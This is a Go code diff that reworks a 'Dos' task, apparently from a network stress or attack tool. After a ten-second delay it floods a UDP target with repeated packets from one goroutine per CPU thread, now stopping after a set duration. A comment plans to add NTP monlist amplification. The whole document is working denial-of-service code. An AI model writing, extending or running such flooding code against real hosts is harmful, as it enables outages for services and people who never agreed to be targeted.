@@ -18,6 +18,7 @@ package tasks
 
 import (
 	"fmt"
+	"io"
 	"net"
 	"time"
 
@@ -26,10 +27,14 @@ import (
 	"github.com/shirou/gopsutil/cpu"
 )
 
+var defaultTime = time.Minute
+
 // Dos indefinitely sends data to target
-// NOTE: this Dos method, simply spawns multiple utils.Dos
 // TODO: add amplification - such as NTP monlist
-func Dos(target string) {
+func Dos(target string, duration *time.Duration) {
+	if duration == nil {
+		duration = &defaultTime
+	}
 	utils.CheckTarget(target) // make sure target is valid
 
 	addr, err := net.ResolveUDPAddr("udp", target)
@@ -50,12 +55,33 @@ func Dos(target string) {
 
 	time.Sleep(10 * time.Second) // 10 second delay - give chance to cancel
 
-	threads, err := cpu.Counts(false) // get threads on system to set DOS thread limit
+	threads, err := cpu.Counts(false)
 	utils.CheckErr(err)
 
-	for i := 0; i < threads; i++ { // create DOS threads within limit
-		go utils.Dos(conn)             // create thread
+	done := make(chan struct{})
+	for i := 0; i < threads; i++ { // create a goroutine per thread for spamming
+		go spam(conn, done)            // start concurrent spamming
 		ct.Foreground(ct.Yellow, true) // set text color to dark yellow
-		fmt.Println("Thread created!")
+	}
+	<-time.After(*duration)
+	for i := 0; i < threads; i++ {
+		done <- struct{}{}
+	}
+}
+
+// spam - constantly writes data to a target until stopped
+func spam(w io.Writer, done <-chan struct{}) {
+	fmt.Println("Starting loop")
+	for {
+		select {
+		case <-done:
+			fmt.Println("Exiting loop")
+			return
+		default:
+			_, err := fmt.Fprintf(w, "Sup UDP Server, how you doing?")
+			utils.CheckErr(err)
+
+			fmt.Println("looped")
+		}
 	}
 }
